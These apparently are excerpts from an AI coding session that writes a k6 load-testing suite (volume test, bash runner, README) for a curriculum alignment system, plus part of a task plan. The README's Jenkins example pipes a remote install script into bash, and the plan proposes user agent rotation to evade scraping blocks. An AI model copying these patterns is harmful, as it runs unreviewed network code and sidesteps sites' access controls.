return;\n    \n    // Start multiple comprehensive analyses\n    const analysisIds = [];\n    const analysisCount = Math.floor(Math.random() * 3) + 2; // 2-4 analyses\n    \n    for (let i = 0; i < analysisCount; i++) {\n      const testData = generateTestData();\n      testData.analysis.programId = config.testData.programId;\n      testData.analysis.configuration.analysisDepth = 'comprehensive';\n      testData.analysis.configuration.comparisonUniversities = [\n        'MIT', 'Stanford', 'Carnegie Mellon', 'UC Berkeley', 'Harvard'\n      ]; // Full comparison set\n      \n      const analysisId = startAnalysis();\n      if (analysisId) {\n        analysisIds.push(analysisId);\n      }\n      \n      sleep(5); // Spacing between analysis starts\n    }\n    \n    sleep(10); // Allow analyses to initialize\n    \n    // Check status of all started analyses\n    let runningAnalyses = 0;\n    analysisIds.forEach(id => {\n      const status = getAnalysisStatus(id);\n      if (status && (status === 'running' || status === 'initiated' || status === 'completed')) {\n        runningAnalyses++;\n      }\n      sleep(2);\n    });\n    \n    check(runningAnalyses, {\n      'bulk analysis tracking': (count) => count > 0,\n      'majority of analyses started': (count) => count >= analysisIds.length * 0.5\n    });\n    \n    sleep(15); // Allow bulk processing time\n  });\n}\n\nfunction dataIntensiveQueries() {\n  group('Data-Intensive Queries', function() {\n    \n    if (!authenticate()) return;\n    \n    // Perform queries that require processing large datasets\n    const queries = [\n      '/programs?limit=1000&includeDetails=true',\n      '/programs/search?query=computer&includeTranscripts=true',\n      '/analysis/reports?format=detailed&includeComparisons=true',\n      '/documents/search?type=all&includeContent=true'\n    ];\n    \n    queries.forEach((endpoint, index) => {\n      const response = makeAuthenticatedRequest(\n        'GET',\n        `${config.baseUrl}${endpoint}`,\n        null,\n        { \n          tags: { \n            name: `data_query_${index + 1}`,\n            queryType: 'intensive'\n          } \n        }\n      );\n      \n      if (response) {\n        check(response, {\n          [`data query ${index + 1} responded`]: (r) => r.status !== 0,\n          [`data query ${index + 1} not server error`]: (r) => r.status < 500,\n          [`data query ${index + 1} reasonable time`]: (r) => r.timings.duration < 60000\n        });\n      }\n      \n      sleep(5); // Allow processing time between intensive queries\n    });\n    \n    sleep(10);\n  });\n}\n\nexport function setup() {\n  console.log('üìä Starting Volume Test');\n  console.log(`Target: ${config.baseUrl}`);\n  console.log('Focus: System behavior under high data volume');\n  console.log('Operations:');\n  console.log('  - Bulk Program Creation (30%): Multiple programs with extensive data');\n  console.log('  - Mass Document Upload (30%): Rapid document processing');\n  console.log('  - Bulk Analysis Operations (20%): Multiple concurrent analyses');\n  console.log('  - Data-Intensive Queries (20%): Large dataset processing');\n  console.log('');\n  \n  // Verify system readiness\n  const healthOk = healthCheck();\n  if (!healthOk) {\n    throw new Error('System health check failed');\n  }\n  \n  const authOk = authenticate();\n  if (!authOk) {\n    throw new Error('Authentication failed');\n  }\n  \n  console.log('‚úÖ Volume test ready to begin');\n  \n  return { \n    startTime: Date.now(),\n    dataOperations: 0,\n    volumeMetrics: {\n      programsCreated: 0,\n      documentsUploaded: 0,\n      analysesStarted: 0\n    }\n  };\n}\n\nexport function teardown(data) {\n  const duration = Math.round((Date.now() - data.startTime) / 1000);\n  \n  console.log('üìä Volume Test Completed');\n  console.log('');\n  console.log('üìà Volume Test Results:');\n  console.log(`Duration: ${duration} seconds`);\n  console.log(`Total Requests: ${requestCount.count || 0}`);\n  console.log(`Data Operations: ${uploadSuccesses.count + analysisStarts.count || 0}`);\n  console.log(`Average Response Time: ${Math.round(responseTime.avg || 0)}ms`);\n  console.log(`95th Percentile: ${Math.round(responseTime.p95 || 0)}ms`);\n  console.log(`99th Percentile: ${Math.round(responseTime.p99 || 0)}ms`);\n  console.log(`Error Rate: ${Math.round((errorRate.rate || 0) * 10000) / 100}%`);\n  console.log('');\n  \n  // Volume-specific analysis\n  const avgResponseTime = responseTime.avg || 0;\n  const errorRatePercent = (errorRate.rate || 0) * 100;\n  const dataOperationsPerSecond = (uploadSuccesses.count + analysisStarts.count || 0) / duration;\n  \n  console.log('üíæ Volume Processing Assessment:');\n  console.log(`Data Operations Rate: ${Math.round(dataOperationsPerSecond * 100) / 100} per second`);\n  console.log(`System Data Capacity: ${uploadSuccesses.count + analysisStarts.count || 0} operations handled`);\n  console.log(`Upload Success Rate: ${Math.round((uploadSuccesses.count / (uploadSuccesses.count + 1)) * 10000) / 100}%`);\n  console.log('');\n  \n  // Performance benchmarks for volume operations\n  if (avgResponseTime < 15000) {\n    console.log('‚úÖ EXCELLENT: System handling volume operations efficiently');\n  } else if (avgResponseTime < 40000) {\n    console.log('‚ö†Ô∏è  ACCEPTABLE: Volume operations within reasonable time');\n  } else {\n    console.log('‚ùå POOR: Volume operations taking too long');\n  }\n  \n  if (errorRatePercent < 10) {\n    console.log('‚úÖ EXCELLENT: Low error rate despite high data volume');\n  } else if (errorRatePercent < 15) {\n    console.log('‚ö†Ô∏è  ACCEPTABLE: Moderate error rate for volume operations');\n  } else {\n    console.log('‚ùå POOR: High error rate indicates volume processing issues');\n  }\n  \n  if (dataOperationsPerSecond > 0.05) {\n    console.log('‚úÖ GOOD: System processing data operations at good rate');\n  } else {\n    console.log('‚ö†Ô∏è  Limited data processing throughput detected');\n  }\n  \n  console.log('');\n  console.log('üí° Volume Test Recommendations:');\n  \n  if (avgResponseTime > 30000) {\n    console.log('- Optimize database queries for large dataset operations');\n    console.log('- Consider implementing data pagination for bulk operations');\n    console.log('- Add database indexing for frequently queried large tables');\n  }\n  \n  if (errorRatePercent > 15) {\n    console.log('- Review memory allocation for large data processing operations');\n    console.log('- Implement data streaming for large file uploads');\n    console.log('- Consider breaking bulk operations into smaller chunks');\n  }\n  \n  if (dataOperationsPerSecond < 0.02) {\n    console.log('- Data processing bottleneck detected - investigate storage I/O');\n    console.log('- Consider implementing asynchronous processing for bulk operations');\n    console.log('- Review database connection pooling for concurrent data operations');\n  }\n  \n  console.log('- Monitor disk space usage during high-volume periods');\n  console.log('- Implement data archiving strategies for long-term volume management');\n  console.log('- Consider implementing compression for large document uploads');\n}"
}

  "content": "#!/bin/bash\n\n# Load Testing Suite Runner\n# Comprehensive k6 load testing orchestration\n\nset -e\n\n# Colors for output\nRED='\\033[0;31m'\nGREEN='\\033[0;32m'\nYELLOW='\\033[1;33m'\nBLUE='\\033[0;34m'\nPURPLE='\\033[0;35m'\nCYAN='\\033[0;36m'\nNC='\\033[0m' # No Color\n\n# Configuration\nSCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"\nK6_SCRIPTS_DIR=\"$SCRIPT_DIR/k6-scripts\"\nRESULTS_DIR=\"$SCRIPT_DIR/results\"\nENVIRONMENT=\"${ENVIRONMENT:-test}\"\nBASE_URL=\"${BASE_URL:-http://localhost:3000}\"\n\n# Test configuration\nSMOKE_VUS=\"${SMOKE_VUS:-2}\"\nLOAD_VUS=\"${LOAD_VUS:-50}\"\nSTRESS_VUS=\"${STRESS_VUS:-100}\"\nSPIKE_VUS=\"${SPIKE_VUS:-150}\"\nVOLUME_VUS=\"${VOLUME_VUS:-40}\"\nSOAK_VUS=\"${SOAK_VUS:-15}\"\n\n# Ensure k6 is installed\ncheck_k6() {\n    if ! command -v k6 &> /dev/null; then\n        echo -e \"${RED}‚ùå k6 is not installed. Please install k6 first.${NC}\"\n        echo \"Visit: https://k6.io/docs/getting-started/installation/\"\n        exit 1\n    fi\n    \n    echo -e \"${GREEN}‚úÖ k6 is available: $(k6 version | head -n1)${NC}\"\n}\n\n# Create results directory\nsetup_results_dir() {\n    mkdir -p \"$RESULTS_DIR\"\n    rm -f \"$RESULTS_DIR\"/*.json \"$RESULTS_DIR\"/*.html 2>/dev/null || true\n    echo -e \"${BLUE}üìÅ Results directory prepared: $RESULTS_DIR${NC}\"\n}\n\n# Function to run a specific test\nrun_test() {\n    local test_name=\"$1\"\n    local script_file=\"$2\"\n    local description=\"$3\"\n    local vus=\"$4\"\n    \n    echo \"\"\n    echo -e \"${CYAN}üöÄ Starting $test_name${NC}\"\n    echo -e \"${BLUE}üìã $description${NC}\"\n    echo -e \"${YELLOW}üéØ Target: $BASE_URL${NC}\"\n    echo -e \"${YELLOW}üë• VUs: $vus${NC}\"\n    echo \"\"\n    \n    local timestamp=$(date +\"%Y%m%d_%H%M%S\")\n    local results_file=\"$RESULTS_DIR/${test_name,,}_${timestamp}.json\"\n    local summary_file=\"$RESULTS_DIR/${test_name,,}_${timestamp}_summary.json\"\n    \n    # Set environment variables for k6\n    export K6_VUS=\"$vus\"\n    export BASE_URL=\"$BASE_URL\"\n    export ENVIRONMENT=\"$ENVIRONMENT\"\n    \n    # Run the test with JSON output and summary\n    if k6 run \\\n        --out json=\"$results_file\" \\\n        --summary-export=\"$summary_file\" \\\n        \"$K6_SCRIPTS_DIR/$script_file\"; then\n        \n        echo -e \"${GREEN}‚úÖ $test_name completed successfully${NC}\"\n        echo -e \"${BLUE}üìä Results saved to: $(basename \"$results_file\")${NC}\"\n        return 0\n    else\n        echo -e \"${RED}‚ùå $test_name failed${NC}\"\n        return 1\n    fi\n}\n\n# Function to run smoke test\nrun_smoke_test() {\n    run_test \"Smoke Test\" \"smoke-test.js\" \"Basic functionality verification with minimal load\" \"$SMOKE_VUS\"\n}\n\n# Function to run load test\nrun_load_test() {\n    run_test \"Load Test\" \"api-load-test.js\" \"Comprehensive API load testing under expected traffic\" \"$LOAD_VUS\"\n}\n\n# Function to run stress test\nrun_stress_test() {\n    run_test \"Stress Test\" \"stress-test.js\" \"System behavior under extreme load conditions\" \"$STRESS_VUS\"\n}\n\n# Function to run spike test\nrun_spike_test() {\n    run_test \"Spike Test\" \"spike-test.js\" \"System response to sudden traffic spikes\" \"$SPIKE_VUS\"\n}\n\n# Function to run volume test\nrun_volume_test() {\n    run_test \"Volume Test\" \"volume-test.js\" \"High data volume processing capabilities\" \"$VOLUME_VUS\"\n}\n\n# Function to run soak test\nrun_soak_test() {\n    run_test \"Soak Test\" \"soak-test.js\" \"Extended stability and endurance testing (4+ hours)\" \"$SOAK_VUS\"\n}\n\n# Function to run analysis-specific load test\nrun_analysis_load_test() {\n    run_test \"Analysis Load Test\" \"analysis-load-test.js\" \"Analysis workflow performance under load\" \"$LOAD_VUS\"\n}\n\n# Function to show usage\nshow_usage() {\n    echo -e \"${PURPLE}Load Testing Suite - k6 Test Runner${NC}\"\n    echo \"\"\n    echo -e \"${YELLOW}Usage:${NC}\"\n    echo \"  $0 [test_type] [options]\"\n    echo \"\"\n    echo -e \"${YELLOW}Test Types:${NC}\"\n    echo \"  smoke      - Quick functionality check (2 VUs, ~2 minutes)\"\n    echo \"  load       - Standard load test (50 VUs, ~20 minutes)\"\n    echo \"  stress     - Stress test (100 VUs, ~15 minutes)\" \n    echo \"  spike      - Traffic spike test (150 VUs, ~15 minutes)\"\n    echo \"  volume     - High data volume test (40 VUs, ~55 minutes)\"\n    echo \"  soak       - Extended stability test (15 VUs, 4+ hours)\"\n    echo \"  analysis   - Analysis workflow load test (50 VUs, ~20 minutes)\"\n    echo \"  all        - Run all tests except soak\"\n    echo \"  suite      - Run recommended test suite (smoke ‚Üí load ‚Üí stress)\"\n    echo \"\"\n    echo -e \"${YELLOW}Options:${NC}\"\n    echo \"  --base-url URL     Set base URL (default: http://localhost:3000)\"\n    echo \"  --environment ENV  Set environment (default: test)\"\n    echo \"  --results-only     Only generate results, skip test execution\"\n    echo \"  --clean           Clean results directory before running\"\n    echo \"  --help            Show this help message\"\n    echo \"\"\n    echo -e \"${YELLOW}Environment Variables:${NC}\"\n    echo \"  BASE_URL          Target system base URL\"\n    echo \"  ENVIRONMENT       Test environment (test, staging, prod)\"\n    echo \"  SMOKE_VUS         Virtual users for smoke test (default: 2)\"\n    echo \"  LOAD_VUS          Virtual users for load test (default: 50)\"\n    echo \"  STRESS_VUS        Virtual users for stress test (default: 100)\"\n    echo \"  SPIKE_VUS         Virtual users for spike test (default: 150)\"\n    echo \"  VOLUME_VUS        Virtual users for volume test (default: 40)\"\n    echo \"  SOAK_VUS          Virtual users for soak test (default: 15)\"\n    echo \"\"\n    echo -e \"${YELLOW}Examples:${NC}\"\n    echo \"  $0 smoke                              # Quick smoke test\"\n    echo \"  $0 load --base-url http://staging     # Load test against staging\"\n    echo \"  $0 suite --environment production     # Full test suite\"\n    echo \"  BASE_URL=http://prod $0 stress        # Stress test with env var\"\n}\n\n# Function to generate summary report\ngenerate_summary_report() {\n    echo \"\"\n    echo -e \"${PURPLE}üìä Generating Test Summary Report${NC}\"\n    \n    local report_file=\"$RESULTS_DIR/load_test_summary_$(date +\"%Y%m%d_%H%M%S\").md\"\n    \n    cat > \"$report_file\" << EOF\n# Load Testing Summary Report\n\n**Generated:** $(date)\n**Target System:** $BASE_URL\n**Environment:** $ENVIRONMENT\n\n## Test Results Overview\n\nEOF\n    \n    # Process JSON summary files if they exist\n    for summary_file in \"$RESULTS_DIR\"/*_summary.json; do\n        if [[ -f \"$summary_file\" ]]; then\n            local test_name=$(basename \"$summary_file\" _summary.json)\n            echo \"### $test_name\" >> \"$report_file\"\n            echo \"\" >> \"$report_file\"\n            \n            # Extract key metrics using jq if available\n            if command -v jq &> /dev/null && [[ -s \"$summary_file\" ]]; then\n                local avg_duration=$(jq -r '.metrics.http_req_duration.avg // \"N/A\"' \"$summary_file\")\n                local p95_duration=$(jq -r '.metrics.http_req_duration.p95 // \"N/A\"' \"$summary_file\")\n                local error_rate=$(jq -r '.metrics.http_req_failed.rate // \"N/A\"' \"$summary_file\")\n                local total_requests=$(jq -r '.metrics.http_reqs.count // \"N/A\"' \"$summary_file\")\n                \n                cat >> \"$report_file\" << EOF\n- **Average Response Time:** ${avg_duration}ms\n- **95th Percentile:** ${p95_duration}ms  \n- **Error Rate:** ${error_rate}\n- **Total Requests:** ${total_requests}\n\nEOF\n            else\n                echo \"- Summary data not available\" >> \"$report_file\"\n                echo \"\" >> \"$report_file\"\n            fi\n        fi\n    done\n    \n    cat >> \"$report_file\" << EOF\n\n## Test Files Generated\n\nEOF\n    \n    # List all result files\n    for result_file in \"$RESULTS_DIR\"/*.json; do\n        if [[ -f \"$result_file\" ]]; then\n            echo \"- $(basename \"$result_file\")\" >> \"$report_file\"\n        fi\n    done\n    \n    echo \"\" >> \"$report_file\"\n    echo \"---\" >> \"$report_file\"\n    echo \"*Report generated by k6 Load Testing Suite*\" >> \"$report_file\"\n    \n    echo -e \"${GREEN}‚úÖ Summary report generated: $(basename \"$report_file\")${NC}\"\n}\n\n# Main execution\nmain() {\n    echo -e \"${PURPLE}üéØ k6 Load Testing Suite${NC}\"\n    echo -e \"${BLUE}Target: $BASE_URL${NC}\"\n    echo -e \"${BLUE}Environment: $ENVIRONMENT${NC}\"\n    echo \"\"\n    \n    # Parse command line arguments\n    local test_type=\"\"\n    local clean_results=false\n    local results_only=false\n    \n    while [[ $# -gt 0 ]]; do\n        case $1 in\n            --base-url)\n                BASE_URL=\"$2\"\n                shift 2\n                ;;\n            --environment)\n                ENVIRONMENT=\"$2\" \n                shift 2\n                ;;\n            --clean)\n                clean_results=true\n                shift\n                ;;\n            --results-only)\n                results_only=true\n                shift\n                ;;\n            --help|-h)\n                show_usage\n                exit 0\n                ;;\n            smoke|load|stress|spike|volume|soak|analysis|all|suite)\n                test_type=\"$1\"\n                shift\n                ;;\n            *)\n                echo -e \"${RED}‚ùå Unknown option: $1${NC}\"\n                show_usage\n                exit 1\n                ;;\n        esac\n    done\n    \n    # Check prerequisites\n    check_k6\n    \n    # Setup results directory\n    if [[ \"$clean_results\" == true ]]; then\n        rm -rf \"$RESULTS_DIR\"\n    fi\n    setup_results_dir\n    \n    # Handle results-only mode\n    if [[ \"$results_only\" == true ]]; then\n        generate_summary_report\n        exit 0\n    fi\n    \n    # Execute tests based on type\n    case \"$test_type\" in\n        smoke)\n            run_smoke_test\n            ;;\n        load)\n            run_load_test\n            ;;\n        stress) \n            run_stress_test\n            ;;\n        spike)\n            run_spike_test\n            ;;\n        volume)\n            run_volume_test\n            ;;\n        soak)\n            echo -e \"${YELLOW}‚ö†Ô∏è  Warning: Soak test will run for 4+ hours${NC}\"\n            echo -e \"${YELLOW}Press Ctrl+C within 10 seconds to cancel...${NC}\"\n            sleep 10\n            run_soak_test\n            ;;\n        analysis)\n            run_analysis_load_test\n            ;;\n        all)\n            echo -e \"${CYAN}üéØ Running All Tests (except soak)${NC}\"\n            run_smoke_test && \\\n            run_load_test && \\\n            run_stress_test && \\\n            run_spike_test && \\\n            run_volume_test && \\\n            run_analysis_load_test\n            ;;\n        suite)\n            echo -e \"${CYAN}üéØ Running Recommended Test Suite${NC}\"\n            run_smoke_test && \\\n            run_load_test && \\\n            run_stress_test\n            ;;\n        \"\")\n            echo -e \"${YELLOW}No test type specified. Running smoke test...${NC}\"\n            run_smoke_test\n            ;;\n        *)\n            echo -e \"${RED}‚ùå Invalid test type: $test_type${NC}\"\n            show_usage\n            exit 1\n            ;;\n    esac\n    \n    # Generate summary report\n    generate_summary_report\n    \n    echo \"\"\n    echo -e \"${GREEN}üéâ Load testing completed!${NC}\"\n    echo -e \"${BLUE}üìÇ Results available in: $RESULTS_DIR${NC}\"\n    echo \"\"\n}\n\n# Run main function with all arguments\nmain \"$@\""
}
```

  "content": "# Load Testing Suite\n\nComprehensive performance testing for the Curriculum Alignment system using k6.\n\n## Overview\n\nThis load testing suite provides thorough performance validation across multiple scenarios:\n\n- **Smoke Tests**: Basic functionality verification with minimal load\n- **Load Tests**: Expected traffic simulation with realistic user patterns  \n- **Stress Tests**: System behavior beyond normal capacity\n- **Spike Tests**: Response to sudden traffic increases\n- **Volume Tests**: High data volume processing capabilities\n- **Soak Tests**: Extended stability over time (4+ hours)\n- **Analysis Tests**: Workflow-specific load testing for curriculum analysis\n\n## Prerequisites\n\n### k6 Installation\n\nInstall k6 from [k6.io](https://k6.io/docs/getting-started/installation/):\n\n```bash\n# macOS\nbrew install k6\n\n# Linux\nsudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys C5AD17C747E3415A3642D57D77C6C491D6AC1D69\necho \"deb https://dl.k6.io/deb stable main\" | sudo tee /etc/apt/sources.list.d/k6.list\nsudo apt-get update\nsudo apt-get install k6\n\n# Windows\nchoco install k6\n```\n\n### System Requirements\n\n- Target system running and accessible\n- Valid authentication credentials configured\n- Sufficient system resources for test execution\n\n## Quick Start\n\n### Run Basic Smoke Test\n```bash\n./run-load-tests.sh smoke\n```\n\n### Run Load Test Suite\n```bash\n./run-load-tests.sh suite --base-url http://your-system.com\n```\n\n### Run All Tests\n```bash\n./run-load-tests.sh all --environment staging\n```\n\n## Test Types\n\n### Smoke Test (`smoke-test.js`)\n- **Duration**: ~2 minutes\n- **VUs**: 2\n- **Purpose**: Verify basic system functionality\n- **Thresholds**: Strict (p95 < 1s, <1% errors)\n\n```bash\n./run-load-tests.sh smoke\n```\n\n### Load Test (`api-load-test.js`)\n- **Duration**: ~20 minutes  \n- **VUs**: 50 (configurable)\n- **Purpose**: Simulate expected production traffic\n- **Scenarios**: 70% user workflow, 20% admin, 10% API stress\n\n```bash\n./run-load-tests.sh load\n```\n\n### Stress Test (`stress-test.js`)\n- **Duration**: ~15 minutes\n- **VUs**: 100 (configurable) \n- **Purpose**: Test system beyond normal capacity\n- **Focus**: Heavy read/write operations, analysis stress\n\n```bash\n./run-load-tests.sh stress\n```\n\n### Spike Test (`spike-test.js`)\n- **Duration**: ~15 minutes\n- **VUs**: Varies (up to 150)\n- **Purpose**: Test sudden traffic spike handling\n- **Pattern**: Normal ‚Üí Spike ‚Üí Recovery cycles\n\n```bash\n./run-load-tests.sh spike\n```\n\n### Volume Test (`volume-test.js`)\n- **Duration**: ~55 minutes\n- **VUs**: 40\n- **Purpose**: High data volume processing\n- **Focus**: Bulk operations, large datasets, intensive queries\n\n```bash\n./run-load-tests.sh volume\n```\n\n### Soak Test (`soak-test.js`)\n- **Duration**: 4+ hours\n- **VUs**: 15\n- **Purpose**: Extended stability testing\n- **Focus**: Memory leaks, performance degradation over time\n\n```bash\n./run-load-tests.sh soak  # Warning: Long duration!\n```\n\n### Analysis Load Test (`analysis-load-test.js`)\n- **Duration**: ~20 minutes\n- **VUs**: 50\n- **Purpose**: Analysis workflow performance\n- **Focus**: Curriculum analysis operations, document processing\n\n```bash\n./run-load-tests.sh analysis\n```\n\n## Configuration\n\n### Environment Variables\n\n```bash\n# Target system\nexport BASE_URL=\"http://localhost:3000\"\nexport ENVIRONMENT=\"test\"\n\n# Virtual user counts (optional)\nexport SMOKE_VUS=2\nexport LOAD_VUS=50\nexport STRESS_VUS=100\nexport SPIKE_VUS=150\nexport VOLUME_VUS=40\nexport SOAK_VUS=15\n\n# Authentication (if required)\nexport K6_AUTH_TOKEN=\"your-auth-token\"\nexport K6_API_KEY=\"your-api-key\"\n```\n\n### Test Configuration (`config.js`)\n\nThe central configuration file contains:\n\n- **Base URLs and endpoints**\n- **Performance thresholds**\n- **Test data and scenarios**  \n- **Staging configurations for different load patterns**\n\nKey thresholds:\n```javascript\nthresholds: {\n  http_req_duration: { p95: 2000, p99: 5000 },\n  http_req_failed: { rate: 0.05 },\n  'http_req_duration{name:analysis}': { p95: 10000, p99: 30000 }\n}\n```\n\n## Test Execution\n\n### Individual Tests\n\n```bash\n# Quick verification\n./run-load-tests.sh smoke --base-url http://staging.company.com\n\n# Production load simulation  \n./run-load-tests.sh load --environment production\n\n# Capacity testing\n./run-load-tests.sh stress --base-url https://api.company.com\n```\n\n### Test Suites\n\n```bash\n# Recommended suite (smoke ‚Üí load ‚Üí stress)\n./run-load-tests.sh suite\n\n# Complete testing (all except soak)\n./run-load-tests.sh all\n\n# With custom configuration\nBASE_URL=https://staging.api.com LOAD_VUS=100 ./run-load-tests.sh suite\n```\n\n### Advanced Usage\n\n```bash\n# Clean previous results and run\n./run-load-tests.sh load --clean\n\n# Generate summary report from existing results\n./run-load-tests.sh --results-only\n\n# Custom environment and high load\n./run-load-tests.sh stress --environment prod --base-url https://prod.api.com\n```\n\n## Results and Analysis\n\n### Result Files\n\nTests generate comprehensive results in `results/`:\n\n- `{test}_YYYYMMDD_HHMMSS.json`: Detailed k6 metrics\n- `{test}_YYYYMMDD_HHMMSS_summary.json`: Summary statistics  \n- `load_test_summary_YYYYMMDD_HHMMSS.md`: Consolidated report\n\n### Key Metrics\n\n**Response Times**:\n- Average response time\n- 95th percentile (p95)\n- 99th percentile (p99)\n- Maximum response time\n\n**Error Rates**:\n- HTTP request failure rate\n- Application error rate\n- Timeout rate\n\n**Throughput**:\n- Requests per second\n- Data operations per second\n- Successful transaction rate\n\n**System Stability**:\n- Error rate trends over time\n- Response time degradation\n- System health consistency\n\n### Performance Analysis\n\nThe test suite automatically provides:\n\n- **Pass/Fail Assessment**: Based on predefined thresholds\n- **Performance Benchmarks**: Comparative analysis against targets\n- **Trend Analysis**: Performance changes over test duration\n- **Recommendations**: Specific improvement suggestions\n\nExample output:\n```\n‚úÖ EXCELLENT: Response times within acceptable limits\n‚ö†Ô∏è  WARN: Error rate above 1% threshold  \n‚ùå FAIL: 95th percentile exceeded 5 seconds\n```\n\n## Integration with CI/CD\n\n### GitHub Actions Example\n\n```yaml\nname: Load Tests\non: [push, pull_request]\n\njobs:\n  load-test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v3\n      \n      - name: Install k6\n        run: |\n          sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys C5AD17C747E3415A3642D57D77C6C491D6AC1D69\n          echo \"deb https://dl.k6.io/deb stable main\" | sudo tee /etc/apt/sources.list.d/k6.list\n          sudo apt-get update\n          sudo apt-get install k6\n          \n      - name: Run Load Tests\n        run: |\n          cd tests/load\n          ./run-load-tests.sh suite --base-url ${{ secrets.STAGING_URL }}\n        env:\n          ENVIRONMENT: staging\n          \n      - name: Upload Results\n        uses: actions/upload-artifact@v3\n        with:\n          name: load-test-results\n          path: tests/load/results/\n```\n\n### Jenkins Pipeline\n\n```groovy\npipeline {\n    agent any\n    \n    environment {\n        BASE_URL = \"${params.TARGET_URL ?: 'http://staging.company.com'}\"\n        ENVIRONMENT = \"${params.ENVIRONMENT ?: 'staging'}\"\n    }\n    \n    stages {\n        stage('Install k6') {\n            steps {\n                sh 'curl -s https://raw.githubusercontent.com/loadimpact/k6/master/install.sh | bash'\n            }\n        }\n        \n        stage('Load Tests') {\n            parallel {\n                stage('Smoke Test') {\n                    steps {\n                        sh 'cd tests/load && ./run-load-tests.sh smoke'\n                    }\n                }\n                \n                stage('Load Test') {\n                    when { \n                        anyOf {\n                            branch 'main'\n                            branch 'staging'\n                        }\n                    }\n                    steps {\n                        sh 'cd tests/load && ./run-load-tests.sh load'\n                    }\n                }\n            }\n        }\n        \n        stage('Archive Results') {\n            steps {\n                archiveArtifacts artifacts: 'tests/load/results/*', allowEmptyArchive: false\n                publishHTML([\n                    allowMissing: false,\n                    alwaysLinkToLastBuild: true,\n                    keepAll: true,\n                    reportDir: 'tests/load/results',\n                    reportFiles: '*.md',\n                    reportName: 'Load Test Report'\n                ])\n            }\n        }\n    }\n}\n```\n\n## Troubleshooting\n\n### Common Issues\n\n**k6 Not Found**:\n```bash\n# Install k6 using package manager\nbrew install k6  # macOS\nsudo apt-get install k6  # Linux\n```\n\n**Connection Refused**:\n- Verify target system is running\n- Check BASE_URL configuration\n- Confirm network connectivity and firewall rules\n\n**Authentication Failures**:\n- Verify credentials in `config.js`\n- Check token expiration\n- Confirm API endpoint authentication requirements\n\n**High Error Rates**:\n- Reduce virtual user count\n- Increase think time between requests\n- Check system resources and capacity\n\n**Timeout Issues**:\n- Increase timeout thresholds in test configuration\n- Verify system performance under load\n- Check for network latency issues\n\n### Debugging\n\nEnable verbose output:\n```bash\nK6_LOG_LEVEL=debug ./run-load-tests.sh smoke\n```\n\nRun individual k6 script:\n```bash\ncd k6-scripts\nk6 run --vus 10 --duration 30s smoke-test.js\n```\n\nMonitor system resources during tests:\n```bash\n# Monitor target system\nhtop\niostat 1\nnetstat -i 1\n\n# Monitor test runner\ndocker stats  # if using Docker\nps aux | grep k6\n```\n\n## Best Practices\n\n### Test Design\n\n1. **Start Small**: Begin with smoke tests before scaling up\n2. **Realistic Scenarios**: Model actual user behavior patterns  \n3. **Data Variety**: Use diverse test data to avoid caching effects\n4. **Think Time**: Include realistic delays between operations\n5. **Gradual Ramp**: Increase load gradually rather than instantly\n\n### Performance Targets\n\n- **Response Time**: p95 < 2s, p99 < 5s for general operations\n- **Analysis Operations**: p95 < 10s, p99 < 30s for complex processing\n- **Error Rate**: < 5% under normal load, < 10% under stress\n- **Throughput**: Maintain target RPS with acceptable response times\n- **Stability**: No significant degradation over extended periods\n\n### Test Environment\n\n- Use dedicated testing environments when possible\n- Ensure consistent test data across runs\n- Monitor system resources during testing\n- Clean up test data after completion\n- Document any environment-specific configurations\n\n### Result Interpretation\n\n- Focus on trends rather than absolute values\n- Compare results across test runs for regression detection  \n- Correlate performance metrics with business KPIs\n- Consider system resource utilization alongside response times\n- Document and track performance improvements over time\n\n## Contributing\n\nWhen adding new tests:\n\n1. Follow existing naming conventions\n2. Include comprehensive setup/teardown functions\n3. Add appropriate performance thresholds\n4. Document test purpose and scenarios\n5. Update this README with new test information\n\nFor questions or issues, refer to the project documentation or create an issue in the repository."
}

   958‚Üí
   959‚Üí## Task Dependencies
   960‚Üí
   961‚Üí### Critical Path
   962‚Üí1. Infrastructure Setup (Tasks 1-10) ‚Üí Must complete first
   963‚Üí2. Database and Core Services (Tasks 11-20) ‚Üí Depends on infrastructure
   964‚Üí3. Agent Implementation (Tasks 21-35) ‚Üí Can start after core services
   965‚Üí4. Frontend Development (Tasks 36-50) ‚Üí Can run parallel with agents
   966‚Üí5. Integration and Testing (Tasks 51-60) ‚Üí After agents and frontend
   967‚Üí6. Deployment and Documentation (Tasks 61-70) ‚Üí Final phase
   968‚Üí
   969‚Üí### Parallel Execution Opportunities
   970‚Üí- Frontend (36-50) and Agents (21-35) can be developed simultaneously
   971‚Üí- Documentation (64-68) can start during integration phase
   972‚Üí- Testing (51-54) can begin as components complete
   973‚Üí
   974‚Üí## Success Criteria
   975‚Üí
   976‚Üí- All 70 tasks marked as completed [x]
   977‚Üí- System deployed to production environment
   978‚Üí- All tests passing with 80%+ coverage
   979‚Üí- Documentation complete and approved
   980‚Üí- System meeting all performance metrics
   981‚Üí- Cost targets achieved (<$500/month AWS, <$200/month LLM)
   982‚Üí
   983‚Üí## Risk Mitigation
   984‚Üí
   985‚Üí- **Risk**: LLM API availability
   986‚Üí  - **Mitigation**: Implement fallback models in configuration
   987‚Üí
   988‚Üí- **Risk**: Web scraping blocks
   989‚Üí  - **Mitigation**: Implement rate limiting and user agent rotation
   990‚Üí
   991‚Üí- **Risk**: Cost overruns
   992‚Üí  - **Mitigation**: Monitor costs in real-time with alerts
   993‚Üí
   994‚Üí- **Risk**: PostgreSQL connection limits
   995‚Üí  - **Mitigation**: Implement connection pooling early
   996‚Üí
   997‚Üí## Conclusion
   998‚Üí
   999‚ÜíThis task breakdown provides a clear roadmap for implementing the Multi-Agent Curriculum Alignment System. Each task is atomic, testable, and contributes to the overall system functionality. Following this plan ensures systematic development with proper quality controls at each stage.

